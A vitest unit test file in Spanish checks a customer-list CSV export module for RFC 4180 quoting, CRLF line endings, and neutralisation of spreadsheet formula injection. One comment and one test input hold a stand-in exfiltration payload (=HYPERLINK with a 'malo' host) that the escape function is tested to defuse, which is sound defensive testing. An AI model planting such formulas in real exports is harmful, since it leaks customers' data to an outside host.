import { describe, it, expect } from 'vitest';
import { escaparCelda, generarCsv } from './exportarClientes';

// Módulo puro: nada de BD acá. Lo que se prueba es lo que rompe un CSV en la práctica.

describe('escaparCelda', () => {
  it('neutraliza las celdas que Excel ejecutaría como fórmula', () => {
    // CSV injection. El archivo lo abre el DUEÑO en su computadora, confiando en él, así que una
    // celda como =HYPERLINK("http://malo/"&A1) convierte su propio export en un exfiltrador de su
    // base de clientes. El apóstrofo le dice a Excel "esto es texto" y no se muestra.
    expect(escaparCelda('=1+1')).toBe('"\'=1+1"');
    expect(escaparCelda('=HYPERLINK("http://malo/")')).toBe('"\'=HYPERLINK(""http://malo/"")"');
    expect(escaparCelda('+34600000000')).toBe('"\'+34600000000"');
    expect(escaparCelda('-2')).toBe('"\'-2"');
    expect(escaparCelda('@usuario')).toBe('"\'@usuario"');
  });

  it('no toca un nombre normal', () => {
    expect(escaparCelda('José Pérez')).toBe('"José Pérez"');
  });

  it('duplica las comillas dobles, como manda RFC 4180', () => {
    expect(escaparCelda('Juan "el Flaco"')).toBe('"Juan ""el Flaco"""');
  });

  it('entrecomilla siempre, aunque no haya comas', () => {
    // Un campo entrecomillado de más es válido; uno de menos corre TODAS las columnas cuando el
    // nombre trae una coma. Se prefiere el error inofensivo.
    expect(escaparCelda('Ana')).toBe('"Ana"');
    expect(escaparCelda('Pérez, Ana')).toBe('"Pérez, Ana"');
  });

  it('sobrevive a saltos de línea dentro de un campo', () => {
    expect(escaparCelda('linea1\nlinea2')).toBe('"linea1\nlinea2"');
  });

  it('trata null, undefined y vacío como celda vacía', () => {
    expect(escaparCelda(null)).toBe('""');
    expect(escaparCelda(undefined)).toBe('""');
    expect(escaparCelda('')).toBe('""');
  });

  it('convierte números sin marcarlos como peligrosos', () => {
    expect(escaparCelda(0)).toBe('"0"');
    expect(escaparCelda(42)).toBe('"42"');
    // Un número NEGATIVO sí empieza con '-', así que se escapa. Es feo pero correcto: preferimos un
    // apóstrofo visible en un caso rarísimo (un saldo negativo no debería existir) antes que dejar
    // pasar el vector.
    expect(escaparCelda(-1)).toBe('"\'-1"');
  });
});

describe('generarCsv', () => {
  it('arma encabezado y filas separados por CRLF', () => {
    // CRLF y no LF: es lo que dice RFC 4180 y lo que Excel en Windows espera.
    const csv = generarCsv([
      { nombre: 'Ana', telefono: '+50377771234', saldo: 3, visitas: 5, alta: '2026-07-01' },
    ]);
    const lineas = csv.split('\r\n');
    expect(lineas).toHaveLength(2);
    expect(lineas[0]).toBe('"Nombre","Teléfono","Saldo","Visitas","Cliente desde"');
    // El teléfono sale con apóstrofo, y eso es CORRECTO, no un efecto colateral: todo teléfono
    // canónico empieza con '+' y cae en el escape. En Excel y Google Sheets el apóstrofo inicial es
    // un marcador de "esto es texto" que NO se muestra — y es justamente lo que evita que Excel
    // convierta +50377771234 en el número 50377771234 y se coma el signo. Sin él, la columna más
    // importante del export llegaría mutilada.
    expect(lineas[1]).toBe(`"Ana","'+50377771234","3","5","2026-07-01"`);
  });

  it('con cero clientes deja solo el encabezado', () => {
    // Un archivo vacío del todo le haría pensar al dueño que la descarga falló.
    expect(generarCsv([]).split('\r\n')).toHaveLength(1);
  });

  it('una fila con una coma en el nombre no corre las columnas', () => {
    const csv = generarCsv([
      { nombre: 'Pérez, Ana', telefono: '+50370000000', saldo: 1, visitas: 1, alta: '2026-07-01' },
    ]);
    // Cinco campos entrecomillados: si el escape fallara, el nombre partiría la fila en seis.
    expect(csv.split('\r\n')[1].match(/","/g)).toHaveLength(4);
  });
});
